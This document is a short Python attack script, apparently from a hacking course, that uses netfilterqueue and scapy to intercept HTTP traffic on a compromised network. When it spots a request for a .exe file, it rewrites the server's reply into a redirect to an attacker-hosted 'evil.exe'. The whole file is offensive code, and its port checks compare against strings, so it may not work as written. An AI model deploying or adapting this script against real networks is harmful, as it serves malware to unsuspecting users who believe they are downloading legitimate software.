#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# service apache2 start to start the web server in kali

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len  # delete those fields every time you modify a packet
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw): # print packets containing http layer
        if scapy_packet[scapy.TCP].dport == "80":
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+].exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == "80":
            if scapy_packet[scapy.TCP].seq in ack_list: # check tcp ack in the request matching tcp seq in the response
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.16/evil-files/evil.exe \n\n")# to redirect the download request to another location
                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()